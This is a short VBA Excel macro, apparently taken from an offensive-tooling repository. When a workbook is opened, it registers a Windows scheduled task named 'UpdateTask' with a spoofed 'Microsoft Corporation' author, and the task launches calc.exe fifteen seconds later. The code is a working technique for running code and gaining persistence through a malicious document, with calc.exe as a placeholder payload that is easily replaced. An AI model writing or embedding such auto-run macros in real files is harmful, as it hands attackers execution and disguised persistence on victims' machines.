Sub Workbook_open()

' https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/ScheduledTask_Create.vba
' svchost.exe will spawn the task 15 seconds after Excel was started

    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim td: Set td = service.NewTask(0)
    td.RegistrationInfo.Author = "Microsoft Corporation"
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim triggers: Set triggers = td.triggers
    Dim trigger: Set trigger = triggers.Create(1)
    Dim startTime: ts = DateAdd("s", 15, Now)
    startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
    trigger.StartBoundary = startTime
    trigger.ID = "TimeTriggerId"
    Dim Action: Set Action = td.Actions.Create(0)
    Action.Path = "C:\Windows\System32\calc.exe"
    Call service.GetFolder("\").RegisterTaskDefinition("UpdateTask", td, 6, , , 3)
    'MsgBox (startTime)

End Sub
